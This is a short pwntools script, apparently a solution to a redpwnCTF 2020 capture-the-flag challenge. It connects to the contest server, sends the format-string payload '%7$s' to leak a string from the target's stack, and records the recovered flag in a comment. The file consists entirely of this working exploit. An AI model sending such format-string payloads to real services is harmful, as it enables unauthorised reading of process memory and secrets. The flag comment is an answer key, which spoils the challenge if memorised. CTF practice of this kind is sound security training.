from pwn import *

#p = process("./secret-flag")
p=remote("2020.redpwnc.tf",31826)

pause()
payload = "%7$s"
p.sendline(payload)
#flag{n0t_s0_s3cr3t_f1ag_n0w}
p.interactive()